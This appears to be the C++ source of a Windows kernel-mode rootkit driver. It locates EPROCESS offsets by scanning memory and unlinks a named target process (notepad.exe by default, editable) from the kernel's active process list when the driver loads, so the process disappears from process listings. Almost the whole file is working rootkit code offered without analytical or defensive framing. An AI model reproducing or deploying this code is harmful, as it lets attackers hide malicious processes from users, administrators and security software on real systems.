#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"
#include "Hide.h"

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{
    nameOffset = CalcProcessNameOffset();
    pidOffset = CalcPIDOffset();
    listEntryOffset = pidOffset + sizeof(HANDLE); // LIST_ENTRY

    if (pidOffset == 0 || nameOffset == 0)
        return FALSE;
    else
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
        return TRUE;
    }
}

extern "C"
VOID HideProcess()
{
    PLIST_ENTRY head, currentNode, prevNode;
    PEPROCESS eprocessStart;
    unsigned char* currentProcess = NULL;
    const char target[] = "notepad.exe"; // Change this name as needed
    ANSI_STRING targetProcessName, currentProcessName;

    eprocessStart = IoGetCurrentProcess();
    head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
    RtlInitAnsiString(&targetProcessName, target);

    do
    {
        currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
        RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

        // Compare process name
        if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

            // Unlink the process from the list
            prevNode = currentNode->Blink;
            prevNode->Flink = currentNode->Flink;

            currentNode->Flink->Blink = prevNode;

            // Update pointers of the target process
            currentNode->Flink = currentNode;
            currentNode->Blink = currentNode;
            break;
        }

        currentNode = currentNode->Flink;
    } while (currentNode != head); // Corrects termination check
}

extern "C"
ULONG CalcPIDOffset()
{
    PEPROCESS peprocess = IoGetCurrentProcess();
    HANDLE pid = PsGetCurrentProcessId();
    PLIST_ENTRY list = NULL;
    int i;

    for (i = 0; i < PAGE_SIZE; i += sizeof(HANDLE))
    {
        if (*(PHANDLE)((PCHAR)peprocess + i) == pid)
        {
            // PLIST_ENTRY - PID
            list = (PLIST_ENTRY)((unsigned char*)peprocess + i + sizeof(HANDLE));

            if (MmIsAddressValid(list))
            {
                if (list == list->Flink->Blink)
                {
                    return i;
                }
            }
        }
    }

    return 0; // Returns 0 if the offset was not found
}

extern "C"
ULONG CalcProcessNameOffset()
{
    PEPROCESS ntosKrnl = PsInitialSystemProcess;
    int i;

    for (i = 0; i < PAGE_SIZE; i++)
    {
        if (RtlCompareMemory((PCHAR)ntosKrnl + i, "System", 6) == 6)
        {
            return i; // Returns the offset of the process name
        }
    }

    return 0; // Returns 0 if the offset was not found
}

// Driver entry point
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver loaded.\n");

    if (!InitializeOffsets())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Failed to initialize offsets.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // Call HideProcess to hide the desired process
    HideProcess();

    return STATUS_SUCCESS;
}

// Function to unload the driver
VOID UnloadDriver(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver unloaded.\n");
}
